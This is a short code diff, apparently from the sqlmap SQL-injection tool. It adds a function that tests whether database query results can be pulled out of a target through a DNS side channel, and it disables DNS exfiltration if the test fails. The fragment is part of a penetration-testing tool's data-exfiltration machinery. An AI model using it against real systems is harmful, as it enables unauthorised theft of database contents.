@@ -34,10 +34,28 @@ from lib.core.data import logger
 from lib.core.data import queries
 from lib.core.enums import DBMS
 from lib.core.enums import PAYLOAD
+from lib.core.settings import FROM_DUMMY_TABLE
 from lib.core.settings import MAX_DNS_LABEL
 from lib.core.settings import PARTIAL_VALUE_MARKER
 from lib.core.unescaper import unescaper
 from lib.request.connect import Connect as Request
+
+
+def dnsTest(payload):
+    logger.info("testing for data retrieval through DNS channel")
+
+    randInt = randomInt()
+    kb.dnsTest = dnsUse(payload, "SELECT %d%s" % (randInt, FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), ""))) == str(randInt)
+
+    if not kb.dnsTest:
+        errMsg = "data retrieval through DNS channel failed. Turning off DNS exfiltration support"
+        logger.error(errMsg)
+
+        conf.dnsDomain = None
+    else:
+        infoMsg = "data retrieval through DNS channel was successful"
+        logger.info(infoMsg)
+
 
 def dnsUse(payload, expression):
     """
